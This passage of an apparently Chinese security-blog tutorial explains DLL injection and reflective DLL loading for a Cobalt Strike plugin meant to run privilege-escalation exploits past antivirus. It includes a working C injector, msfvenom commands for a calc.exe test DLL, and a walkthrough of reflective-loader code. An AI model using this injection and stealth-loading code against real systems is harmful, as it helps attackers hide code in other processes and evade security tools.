@@ -1,0 +1,964 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h1 data-content="1" id="45162a812001637488be7905b640bb20">CS插件之DLL反射加载EXP绕过AV提升权限</h1>
+<h2 data-content="1" id="2c85a08b9910148094b1377cdfc925ea">0x0 前言</h2>
+<p>  本文主要是笔者归纳一些实践经验，针对常见的AV拦截落地提权EXP进行的一些躲避尝试的记录。本文内容并不深入原理，但会尽量说明技术的基本体系和操作的核心步骤，即使你是个萌新，依然可以轻松且愉快地阅读并进行实践。</p>
+<h2 data-content="1" id="5bb3430af5383d70e4ba82e08590fb2c">0x1 DLL注入概念</h2>
+<p><a href="https://zh.wikipedia.org/zh-hans/DLL%E6%B3%A8%E5%85%A5" target="_blank">DLL注入-维基百科</a></p>
+<blockquote>
+<p>DLL注入(DLL Injection)是一种计算机编程技术，它可以强行使另一个进程加载一个动态链接库(DLL)以在其地址空间内运行指定代码。常见用途是改变原先程序的行为，实现程序作者本未设计或可预期的结果。比如用于hook系统调用、读取密码框内容。</p>
+<p>将任意代码注入任意进程的程序被称为DLL注入器。</p>
+</blockquote>
+<p>通俗来说，DLL注入的目标对象是某一进程，然后在该进程的地址空间上注入DLL中的代码并且执行，主要是起到了动态修改程序行为的作用。合理地来说，也可用于动态拓展程序功能，即起到增强作用。</p>
+<h2 data-content="1" id="186dcc831fafd43d01fb9d6e92b7f0a8">0x2 DLL注入方式</h2>
+<p>下面主要介绍两种注入反射方式，对比差异，来帮助学习。</p>
+<h3 data-content="1" id="c0d214f8cd2bcd8fe4caf386eca74bd1">0x2.1 常规DLL注入</h3>
+<p>常规的DLL注入方式是远程线程注入(<code>CreateRemoteThread</code>)<br/>
+步骤如下:<br/>
+1.打开目标进程句柄<br/>
+2.开辟目标进程空间，用于存放需要注入的DLL文件路径<br/>
+3.获取<code>LoadLibrary</code>的地址<br/>
+4.通过<code>CreateRemoteThread</code>函数调用LoadLibrary，传入DLL文件路径的地址作为参数，进行远程动态调用。</p>
+<blockquote>
+<p>技术的核心原理：<br/>
+我们注入器的进程的内存空间是没办法让目标进程访问到的，而核心调用DLL的基础原理是程序执行<code>LoadLibrary</code>函数去加载指定的DLL，所以我们必须要在目标进程空间存放DLL的文件地址(这样目标进程才能调用到)，由于<code>kernel.dll</code>加载的地址在所有进程都是一样的，且<code>LoadLibrary</code>是其导出模块，其RVA地址是固定在PE结构的，所以注入器获取到的API地址是一样，可作用于目标进程，这样我们就可以通过远程执行目标进程的新线程，然后线程执行<code>LoadLibrary</code>函数加载指定DLL实现DLL注入。</p>
+<p>关于为什么系统模块加载地址会相同，可以理解为设计需要，可查阅  <a href="http://www.nynaeve.net/?p=198。" target="_blank">http://www.nynaeve.net/?p=198。</a></p>
+</blockquote>
+<p>先采用VS2019 编写一个简单的DLL: hello.dll<br/>
+DLL_PROCESS_ATTACH状态时执行<code>MessageBoxA</code>:</p>
+<pre><code>MessageBoxW(NULL, TEXT("Hello i am hello!"), TEXT("box"), MB_OK);</code></pre>
+<p>当然如果你本机装有msfvenom,可以更加方便生成一个dll:</p>
+<pre><code>msfvenom -p windows/exec cmd=calc.exe -f dll -o calc32.dll # 生成32位dll
+
+msfvenom -p windows/x64/exec cmd=calc.exe -f dll -o calc64.dll # 生成64位dll</code></pre>
+<p>整完，开始编写注入器,用到核心API函数如下:<br/>
+<a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess" target="_blank">OpenProcess</a></p>
+<pre><code>HANDLE OpenProcess(
+  DWORD dwDesiredAccess, //PROCESS_ALL_ACCESS 进程控制的权限
+  BOOL  bInheritHandle, //false, 句柄是否可以被继承
+  DWORD dwProcessId //目标进程pid,某些系统进程会出错
+);</code></pre>
+<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex" target="_blank">VirtualAllocEx</a></p>
+<pre><code>LPVOID VirtualAllocEx(
+  HANDLE hProcess,  //目标进程句柄 PROCESS_VM_OPERATION 
+  LPVOID lpAddress, //NULL，自动分配空间地址
+  SIZE_T dwSize, //单位byte， 分配的空间区域大小
+  DWORD  flAllocationType, //MEM_COMMIT  内存类型
+  DWORD  flProtect //PAGE_READWRITE， 内存区域权限可读可写
+);</code></pre>
+<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory" target="_blank">WriteProcessMemory</a></p>
+<pre><code>BOOL WriteProcessMemory(
+  HANDLE  hProcess, //目标进程句柄  PROCESS_VM_WRITE and PROCESS_VM_OPERATION 
+  LPVOID  lpBaseAddress, //写入内容的基地址
+  LPCVOID lpBuffer, //指向写入数据的指针
+  SIZE_T  nSize, //写入数据的大小
+  SIZE_T  *lpNumberOfBytesWritten //NULL，不记录写入字节数目
+);</code></pre>
+<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread" target="_blank">CreateRemoteThread</a></p>
+<pre><code>HANDLE CreateRemoteThread(
+  HANDLE                 hProcess, //目标句柄
+  LPSECURITY_ATTRIBUTES  lpThreadAttributes,//NULL，默认描述符
+  SIZE_T                 dwStackSize, //0，使用默认栈大小
+  LPTHREAD_START_ROUTINE lpStartAddress,// 指针指向远程调用函数的地址
+  LPVOID                 lpParameter, //指针指向参数地址
+  DWORD                  dwCreationFlags,//0,立刻执行
+  LPDWORD                lpThreadId //NULL,不返回验证信息
+);</code></pre>
+<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea" target="_blank">GetModuleHandle</a></p>
+<pre><code>HMODULE GetModuleHandleA(
+  LPCSTR lpModuleName //kernel32.dll 模块名称
+);</code></pre>
+<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress" target="_blank">GetProcAddress</a></p>
+<pre><code>FARPROC GetProcAddress(
+  HMODULE hModule, //模块句柄
+  LPCSTR  lpProcName //导出函数名称
+);</code></pre>
+<p>下面开始编写我们的注入器，我的编程规则是先声明必须的变量，这样代码写起来有层次感。<br/>
+VS2019创建个窗口程序项目DllInject:</p>
+<pre><code>#include &lt;iostream&gt;
+#include &lt;Windows.h&gt;
+
+using namespace std;
+int main(int argc, char ** argv)
+{
+    // declare varibales
+    HANDLE processHandle;
+    LPVOID remoteAllocAddr;
+    BOOL writeRet;
+    HMODULE hModule;
+    HANDLE hThread;
+    LPTHREAD_START_ROUTINE  dwLoadAddr;
+    char* dllPath;
+
+    /*
+    wchar_t tPath[] = TEXT("C:\\Users\\god\\Desktop\\test\\hello.dll");
+    LoadLibraryW(tPath);
+    exit(0);
+    */
+    if (argc &lt; 2) {
+        printf("Usage: DllInject.exe pid\n");
+        exit(0);
+    }
+    DWORD pid = atoi(argv[1]);
+    dllPath = argv[2];
+
+    printf("[+] Target pid: %d\n", pid);
+    size_t len = strlen(dllPath) + 1;
+    printf("[+] Inject dll: %s len:%d\n", dllPath, len);
+    //step 1
+    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    if (GetLastError() == NULL) {
+        printf("[+] OpenProcess success!\n");
+    }
+    else {
+        printf("[-] OpenProcess Fail!\n");
+        printf("[-] Code:%d Error : %d \n", processHandle, GetLastError());
+        exit(0);
+    }
+    //wchar_t dllPath[] = TEXT("C:\\Users\\god\\Desktop\\test\\hello.dll");
+    // step 2
+    remoteAllocAddr = VirtualAllocEx(processHandle, NULL, len, MEM_COMMIT, PAGE_READWRITE);
+    if (remoteAllocAddr == NULL) {
+        printf("[-] VirtualAllocEx fail!\n");
+        exit(0);
+    }
+    else {
+        printf("[+] VirtualAllocEx success: %p\n", remoteAllocAddr);
+    }
+    // step 2
+    writeRet = WriteProcessMemory(processHandle, remoteAllocAddr, (LPVOID)dllPath, len, NULL);
+    if (writeRet) {
+        printf("[+] WriteProcessMemory success! \n");
+    }
+    else {
+        printf("[-] WriteProcessMemory fail! \n");
+        exit(0);
+    }
+    // step 3
+    hModule = GetModuleHandle(TEXT("kernel32.dll"));
+    dwLoadAddr = (PTHREAD_START_ROUTINE)GetProcAddress(hModule, "LoadLibraryA");
+
+    if (hModule &amp;&amp; dwLoadAddr) {
+        printf("[+] GetModuleHandle success address:%p\n", hModule);
+        printf("[+] GetProcAddress success address: %p\n", dwLoadAddr);
+    }
+    else {
+        printf("[-] step 3 fail\n");
+        exit(0);
+    }
+    // step 4 
+    hThread = CreateRemoteThread(processHandle, NULL, 0, dwLoadAddr, remoteAllocAddr, 0, NULL);
+    if (hThread == NULL) {
+        printf("[-] CreatRemoteTread error! \n");
+    }
+    else {
+        printf("[+] All done!\n");
+    }
+    // end
+    CloseHandle(processHandle);
+}</code></pre>
+<p>代码相对而言，非常简单易懂，功能也较为丰富，命令行可自定义进程和指定DLL文件。</p>
+<p>注入效果如下：<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20210901215004-82d35d82-0b2b-1.png"/></p>
+<p>这里只能64位注入64位DLL，因为64位注入器如果注入32位进程则地址会不一样，导致失败。</p>
+<h3 data-content="1" id="5a372aa2a269cf8e9e773e5f1c7490d1">0x2.2 DLL反射注入</h3>
+<p>反射DLL是指不依赖于系统自带的<code>LoadLibrary</code>函数，通过将一个完整的功能的DLL文件写入到目标进程空间，然后通过远程执行一个地址无关的<code>ReflectiveLoader</code>函数用于在目标进程空间内存中对DLL进行展开和修补，最终实现类<code>LoadLibrary</code>的功能，去调用DLLMain函数，完成DLL的加载过程。</p>
+<blockquote>
+<p>相比于常规的DLL注入，反射注入能够躲避ProcessExplorer、Procexp64等工具的module检查，文件也无需落地，只能从内存层面来做检测，操作来说更加隐蔽，缺点就是因为使用了很多FUZZ和循环进行定位，实现代码较为复杂，代码量也比较大。</p>
+</blockquote>
+<p>一般DLL在内存加载的流程(非权威):<br/>
+1.检索DLL，文件数据映射到内存中<br/>
+2.检查PE文件有效性（DOS、PE header）<br/>
+3.分配PE文件中的<code>SizeOfImage</code>的内存大小<br/>
+4.解析节区数据，根据PE中的区段对齐大小和VA偏移拷贝到内存空间中<br/>
+5.实际加载到进程地址空间与PE文件中指定的基地址不一致，则需要修复重定向表。<br/>
+6.修复导入表，加载DLL依赖的其他DLL<br/>
+7.根据每个节区的<code>Characteristics</code>属性设置内存页访问属性<br/>
+8.通过<code>AddressOfEntryPoint</code>获取到DllMain的函数地址，进行调用。</p>
+<blockquote>
+<p>LoadLibrary的具体执行流程应该比这个会更为复杂，处理的细节也会更多，处理的步骤可能也不一样，但是程序执行的核心还是Rip执行内存的指令代码，是不断寻址的过程，只要指令和数据正确，便能正确执行。</p>
+</blockquote>
+<p>实际DLL反射加载的流程:<br/>
+下面基于一个较为出名但比较古老却仍然被CS、MSF使用活跃的项目代码进行分析。</p>
+<blockquote>
+<p>有趣的是项目在8年前就已经不再更新，至于为什么叫反射，从结果来说，通过外部调用自身编写的ReflectLoader函数，然后实现<strong>动态加载自己</strong>，动态获取DLL的所有功能，实现完整的控制流程。</p>
+</blockquote>
+<p>Github:<a href="https://github.com/stephenfewer/ReflectiveDLLInjection" target="_blank">ReflectiveDLLInjection</a></p>
+<blockquote>
+<p>Reflective DLL injection is a library injection technique in which the concept of reflective programming is employed to perform the loading of a library from memory into a host process. As such the library is responsible for loading itself by implementing a minimal Portable Executable (PE) file loader. It can then govern, with minimal interaction with the host system and process, how it will load and interact with the host.</p>
+</blockquote>
+<p>这里我从完整的执行流程作为时间线进行debug分析：<br/>
+1）Inject项目<br/>
+入口Inject.C<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20210901215026-8fa2f3ba-0b2b-1.png"/><br/>
+注入部分LoadLibraryR.c<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20210901215043-99fb1a2c-0b2b-1.png"/><br/>
+后面就是常规的远程调用函数执行的流程：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210901215059-a3b50a32-0b2b-1.png"/></p>
+<p>这里我选择跟进<code>GetReflectiveLoaderOffset</code><br/>
+前面先通过预编译判断编译的注射器和DLL的位数是不是一致的，否则return。<br/>
+一致的话，就开始静态解析PE结构的导出表，<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20210901215115-acce05f6-0b2b-1.png"/><br/>
+解读上图的代码,</p>
+<pre><code>uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)-&gt;e_lfanew;</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210901215131-b67d3c66-0b2b-1.png"/><br/>
+获取到PE头的NTheader，解析导出表,获取到名称、地址、序号的数组基址<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20210901215145-bebda3ca-0b2b-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210901215201-c88dbfe8-0b2b-1.png"/></p>
+<p>然后根据<code>NumberOfNames</code>导出函数数目，这里只有一个导出函数，然后数组和序号地址根据4字节偏移开始递增，将<code>uiNameArray</code>转换为char类型比较是否<code>ReflectiveLoader</code>函数，如果是则，加上序号*4+((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfFunctions作为<code>ReflectiveLoader</code>函数，至此完成函数的地址定位工作。</p>
+<blockquote>
+<p>这里不用寻找也可以，调用该函数的时候，放入一个参数存放注射器分配的DLL空间,这样的话通用性会差点，因为有时候我们可能没办法直接获取到地址，只能盲写之类的。</p>
+</blockquote>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210901215217-d21ba566-0b2b-1.png"/></p>
+<blockquote>
+<p>这种能直接通过地址进行调用，而无须进行修正就能够正常运行的函数，采用了地址无关的代码实现，基本的原理实现是将指令部分需要修改的分离出来跟数据部分放在一起，保持指令部分不变，或者保持指令部分不需要改变，不去引用绝对地址。</p>
+</blockquote>
+<p>2）reflective_dll项目<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20210901215249-e5082906-0b2b-1.png"/><br/>
+这个函数首先调用<code>caller</code>，其实现是[<code>_ReturnAddress()</code>],(<a href="https://docs.microsoft.com/zh-cn/cpp/intrinsics/returnaddress?view=msvc-160)用于返回`caller`的下一条指令地址（属于`ReflectiveLoader`进程空间的地址)，" target="_blank">https://docs.microsoft.com/zh-cn/cpp/intrinsics/returnaddress?view=msvc-160)用于返回`caller`的下一条指令地址（属于`ReflectiveLoader`进程空间的地址)，</a></p>
+<p>然后通过不断在内存回溯，暴力匹配DLL文件DOS头<code>MZ</code>来确认DLL的加载地址。</p>
+<p>接下来需要利用PEB来获取进程加载的module模块的地址，只获取kerner.dll、ntdll.dll 这两个执行文件默认会加载的系统模块，从而使用他们的导出函数。</p>
+<pre><code>#ifdef WIN_X64
+    uiBaseAddress = __readgsqword( 0x60 );
+#else
+#ifdef WIN_X86
+    uiBaseAddress = __readfsdword( 0x30 );
+#endif</code></pre>
+<blockquote>
+<p>原理可以查阅:<br/>
+<a href="https://blog.csdn.net/bcbobo21cn/article/details/50450490" target="_blank">获取kernel32.dll基址</a><br/>
+<a href="https://www.bbsmax.com/A/qVdeqAZ1dP/" target="_blank">PEB枚举进程所有模块</a></p>
+<p>这里为了帮助萌新理解，可以简单理解为一种介质，来获取到模块的地址，当然你也可以自己调试一个正常的进程，去查看PEB与进程模块地址的关系来验证下面的说法。</p>
+<pre><code>!peb
+dt _PEB @$peb  
+dt 0x00007ff8`b52653c0 _PEB_LDR_DATA
+dt 0x00007ff8`b52653c0+0x10 _LIST_ENTRY
+dt 0x00000000`007924a0 _LDR_DATA_TABLE_ENTRY</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210901215309-f12baa1e-0b2b-1.png"/></p>
+</blockquote>
+<p>x64系统寄存器位置gs:[0x60]存放的是PEB结构的地址放入<code>uiBaseAddress</code><br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20210901215325-faa962fc-0b2b-1.png"/></p>
+<p>0x0c偏移处即Ldr是一个指向PEB_LDR_DATA结构的指针，代码选择了内存顺序加载<code>InMemoryOrderModuleList</code>，它是一个双链表结构，成环形，链表指向的数据结构便是module加载的信息，其中包括DllBase、BaseDllName等信息，</p>
+<blockquote>
+<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb_ldr_data" target="_blank">PEB_LDR_DATA structure (winternl.h)</a></p>
+</blockquote>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210901215345-0693de3a-0b2c-1.png"/><br/>
+遍历进程模块，进行hash比较，然后下面一大段代码，while一层用于全部遍历，主要找到两个关键module，<code>KERNEL32DLL</code>(里面继续循环3次，找到关键函数<code>LoadLibraryA</code>,<code>GetProcAddress</code>,<code>VirtualAlloc</code>)和<code>NTDLL</code>(循环一次，找到<code>NtFlushInstructionCache</code>),代码实现较为简单直接粗暴，作者的注释很赞。</p>
+<div class="highlight"><pre><span></span><span class="c1">// compare the hash with that of kernel32.dll</span>
+        <span class="k">if</span><span class="p">(</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">uiValueC</span> <span class="o">==</span> <span class="n">KERNEL32DLL_HASH</span> <span class="p">)</span>
+        <span class="p">{</span>
+            <span class="c1">// get this modules base address</span>
+            <span class="n">uiBaseAddress</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONG_PTR</span><span class="p">)((</span><span class="n">PLDR_DATA_TABLE_ENTRY</span><span class="p">)</span><span class="n">uiValueA</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">DllBase</span><span class="p">;</span>
+
+            <span class="c1">// get the VA of the modules NT Header</span>
+            <span class="n">uiExportDir</span> <span class="o">=</span> <span class="n">uiBaseAddress</span> <span class="o">+</span> <span class="p">((</span><span class="n">PIMAGE_DOS_HEADER</span><span class="p">)</span><span class="n">uiBaseAddress</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">e_lfanew</span><span class="p">;</span>
+
+            <span class="c1">// uiNameArray = the address of the modules export directory entry</span>
+            <span class="n">uiNameArray</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONG_PTR</span><span class="p">)</span><span class="o">&amp;</span><span class="p">((</span><span class="n">PIMAGE_NT_HEADERS</span><span class="p">)</span><span class="n">uiExportDir</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">DataDirectory</span><span class="p">[</span> <span class="n">IMAGE_DIRECTORY_ENTRY_EXPORT</span> <span class="p">];</span>
+
+            <span class="c1">// get the VA of the export directory</span>
+            <span class="n">uiExportDir</span> <span class="o">=</span> <span class="p">(</span> <span class="n">uiBaseAddress</span> <span class="o">+</span> <span class="p">((</span><span class="n">PIMAGE_DATA_DIRECTORY</span><span class="p">)</span><span class="n">uiNameArray</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">VirtualAddress</span> <span class="p">);</span>
+
+            <span class="c1">// get the VA for the array of name pointers</span>
+            <span class="n">uiNameArray</span> <span class="o">=</span> <span class="p">(</span> <span class="n">uiBaseAddress</span> <span class="o">+</span> <span class="p">((</span><span class="n">PIMAGE_EXPORT_DIRECTORY</span> <span class="p">)</span><span class="n">uiExportDir</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">AddressOfNames</span> <span class="p">);</span>
+
+            <span class="c1">// get the VA for the array of name ordinals</span>
+            <span class="n">uiNameOrdinals</span> <span class="o">=</span> <span class="p">(</span> <span class="n">uiBaseAddress</span> <span class="o">+</span> <span class="p">((</span><span class="n">PIMAGE_EXPORT_DIRECTORY</span> <span class="p">)</span><span class="n">uiExportDir</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">AddressOfNameOrdinals</span> <span class="p">);</span>
+
+            <span class="n">usCounter</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
+
+            <span class="c1">// loop while we still have imports to find</span>
+            <span class="k">while</span><span class="p">(</span> <span class="n">usCounter</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="p">)</span>
+            <span class="p">{</span>
+                <span class="c1">// compute the hash values for this function name</span>
+                <span class="n">dwHashValue</span> <span class="o">=</span> <span class="n">hash</span><span class="p">(</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span> <span class="n">uiBaseAddress</span> <span class="o">+</span> <span class="n">DEREF_32</span><span class="p">(</span> <span class="n">uiNameArray</span> <span class="p">)</span> <span class="p">)</span>  <span class="p">);</span>
+
+                <span class="c1">// if we have found a function we want we get its virtual address</span>
+                <span class="k">if</span><span class="p">(</span> <span class="n">dwHashValue</span> <span class="o">==</span> <span class="n">LOADLIBRARYA_HASH</span> <span class="o">||</span> <span class="n">dwHashValue</span> <span class="o">==</span> <span class="n">GETPROCADDRESS_HASH</span> <span class="o">||</span> <span class="n">dwHashValue</span> <span class="o">==</span> <span class="n">VIRTUALALLOC_HASH</span> <span class="p">)</span>
+                <span class="p">{</span>
+                    <span class="c1">// get the VA for the array of addresses</span>
+                    <span class="n">uiAddressArray</span> <span class="o">=</span> <span class="p">(</span> <span class="n">uiBaseAddress</span> <span class="o">+</span> <span class="p">((</span><span class="n">PIMAGE_EXPORT_DIRECTORY</span> <span class="p">)</span><span class="n">uiExportDir</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">AddressOfFunctions</span> <span class="p">);</span>
+
+                    <span class="c1">// use this functions name ordinal as an index into the array of name pointers</span>
+                    <span class="n">uiAddressArray</span> <span class="o">+=</span> <span class="p">(</span> <span class="n">DEREF_16</span><span class="p">(</span> <span class="n">uiNameOrdinals</span> <span class="p">)</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">DWORD</span><span class="p">)</span> <span class="p">);</span>
+
+                    <span class="c1">// store this functions VA</span>
+                    <span class="k">if</span><span class="p">(</span> <span class="n">dwHashValue</span> <span class="o">==</span> <span class="n">LOADLIBRARYA_HASH</span> <span class="p">)</span>
+                        <span class="n">pLoadLibraryA</span> <span class="o">=</span> <span class="p">(</span><span class="n">LOADLIBRARYA</span><span class="p">)(</span> <span class="n">uiBaseAddress</span> <span class="o">+</span> <span class="n">DEREF_32</span><span class="p">(</span> <span class="n">uiAddressArray</span> <span class="p">)</span> <span class="p">);</span>
+                    <span class="k">else</span> <span class="nf">if</span><span class="p">(</span> <span class="n">dwHashValue</span> <span class="o">==</span> <span class="n">GETPROCADDRESS_HASH</span> <span class="p">)</span>
+                        <span class="n">pGetProcAddress</span> <span class="o">=</span> <span class="p">(</span><span class="n">GETPROCADDRESS</span><span class="p">)(</span> <span class="n">uiBaseAddress</span> <span class="o">+</span> <span class="n">DEREF_32</span><span class="p">(</span> <span class="n">uiAddressArray</span> <span class="p">)</span> <span class="p">);</span>
+                    <span class="k">else</span> <span class="nf">if</span><span class="p">(</span> <span class="n">dwHashValue</span> <span class="o">==</span> <span class="n">VIRTUALALLOC_HASH</span> <span class="p">)</span>
+                        <span class="n">pVirtualAlloc</span> <span class="o">=</span> <span class="p">(</span><span class="n">VIRTUALALLOC</span><span class="p">)(</span> <span class="n">uiBaseAddress</span> <span class="o">+</span> <span class="n">DEREF_32</span><span class="p">(</span> <span class="n">uiAddressArray</span> <span class="p">)</span> <span class="p">);</span>
+
+                    <span class="c1">// decrement our counter</span>
+                    <span class="n">usCounter</span><span class="o">--</span><span class="p">;</span>
+                <span class="p">}</span>
+
+                <span class="c1">// get the next exported function name</span>
+                <span class="n">uiNameArray</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">DWORD</span><span class="p">);</span>
+
+                <span class="c1">// get the next exported function name ordinal</span>
+                <span class="n">uiNameOrdinals</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">WORD</span><span class="p">);</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+        <span class="k">else</span> <span class="k">if</span><span class="p">(</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">uiValueC</span> <span class="o">==</span> <span class="n">NTDLLDLL_HASH</span> <span class="p">)</span>
+        <span class="p">{</span>
+            <span class="c1">// get this modules base address</span>
+            <span class="n">uiBaseAddress</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONG_PTR</span><span class="p">)((</span><span class="n">PLDR_DATA_TABLE_ENTRY</span><span class="p">)</span><span class="n">uiValueA</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">DllBase</span><span class="p">;</span>
+
+            <span class="c1">// get the VA of the modules NT Header</span>
+            <span class="n">uiExportDir</span> <span class="o">=</span> <span class="n">uiBaseAddress</span> <span class="o">+</span> <span class="p">((</span><span class="n">PIMAGE_DOS_HEADER</span><span class="p">)</span><span class="n">uiBaseAddress</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">e_lfanew</span><span class="p">;</span>
+
+            <span class="c1">// uiNameArray = the address of the modules export directory entry</span>
+            <span class="n">uiNameArray</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONG_PTR</span><span class="p">)</span><span class="o">&amp;</span><span class="p">((</span><span class="n">PIMAGE_NT_HEADERS</span><span class="p">)</span><span class="n">uiExportDir</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">DataDirectory</span><span class="p">[</span> <span class="n">IMAGE_DIRECTORY_ENTRY_EXPORT</span> <span class="p">];</span>
+
+            <span class="c1">// get the VA of the export directory</span>
+            <span class="n">uiExportDir</span> <span class="o">=</span> <span class="p">(</span> <span class="n">uiBaseAddress</span> <span class="o">+</span> <span class="p">((</span><span class="n">PIMAGE_DATA_DIRECTORY</span><span class="p">)</span><span class="n">uiNameArray</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">VirtualAddress</span> <span class="p">);</span>
+
+            <span class="c1">// get the VA for the array of name pointers</span>
+            <span class="n">uiNameArray</span> <span class="o">=</span> <span class="p">(</span> <span class="n">uiBaseAddress</span> <span class="o">+</span> <span class="p">((</span><span class="n">PIMAGE_EXPORT_DIRECTORY</span> <span class="p">)</span><span class="n">uiExportDir</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">AddressOfNames</span> <span class="p">);</span>
+
+            <span class="c1">// get the VA for the array of name ordinals</span>
+            <span class="n">uiNameOrdinals</span> <span class="o">=</span> <span class="p">(</span> <span class="n">uiBaseAddress</span> <span class="o">+</span> <span class="p">((</span><span class="n">PIMAGE_EXPORT_DIRECTORY</span> <span class="p">)</span><span class="n">uiExportDir</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">AddressOfNameOrdinals</span> <span class="p">);</span>
+
+            <span class="n">usCounter</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+
+            <span class="c1">// loop while we still have imports to find</span>
+            <span class="k">while</span><span class="p">(</span> <span class="n">usCounter</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="p">)</span>
+            <span class="p">{</span>
+                <span class="c1">// compute the hash values for this function name</span>
+                <span class="n">dwHashValue</span> <span class="o">=</span> <span class="n">hash</span><span class="p">(</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span> <span class="n">uiBaseAddress</span> <span class="o">+</span> <span class="n">DEREF_32</span><span class="p">(</span> <span class="n">uiNameArray</span> <span class="p">)</span> <span class="p">)</span>  <span class="p">);</span>
+
+                <span class="c1">// if we have found a function we want we get its virtual address</span>
+                <span class="k">if</span><span class="p">(</span> <span class="n">dwHashValue</span> <span class="o">==</span> <span class="n">NTFLUSHINSTRUCTIONCACHE_HASH</span> <span class="p">)</span>
+                <span class="p">{</span>
+                    <span class="c1">// get the VA for the array of addresses</span>
+                    <span class="n">uiAddressArray</span> <span class="o">=</span> <span class="p">(</span> <span class="n">uiBaseAddress</span> <span class="o">+</span> <span class="p">((</span><span class="n">PIMAGE_EXPORT_DIRECTORY</span> <span class="p">)</span><span class="n">uiExportDir</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">AddressOfFunctions</span> <span class="p">);</span>
+
+                    <span class="c1">// use this functions name ordinal as an index into the array of name pointers</span>
+                    <span class="n">uiAddressArray</span> <span class="o">+=</span> <span class="p">(</span> <span class="n">DEREF_16</span><span class="p">(</span> <span class="n">uiNameOrdinals</span> <span class="p">)</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">DWORD</span><span class="p">)</span> <span class="p">);</span>
+
+                    <span class="c1">// store this functions VA</span>
+                    <span class="k">if</span><span class="p">(</span> <span class="n">dwHashValue</span> <span class="o">==</span> <span class="n">NTFLUSHINSTRUCTIONCACHE_HASH</span> <span class="p">)</span>
+                        <span class="n">pNtFlushInstructionCache</span> <span class="o">=</span> <span class="p">(</span><span class="n">NTFLUSHINSTRUCTIONCACHE</span><span class="p">)(</span> <span class="n">uiBaseAddress</span> <span class="o">+</span> <span class="n">DEREF_32</span><span class="p">(</span> <span class="n">uiAddressArray</span> <span class="p">)</span> <span class="p">);</span>
+
+                    <span class="c1">// decrement our counter</span>
+                    <span class="n">usCounter</span><span class="o">--</span><span class="p">;</span>
+                <span class="p">}</span>
+
+                <span class="c1">// get the next exported function name</span>
+                <span class="n">uiNameArray</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">DWORD</span><span class="p">);</span>
+
+                <span class="c1">// get the next exported function name ordinal</span>
+                <span class="n">uiNameOrdinals</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">WORD</span><span class="p">);</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+
+        <span class="c1">// we stop searching when we have found everything we need.</span>
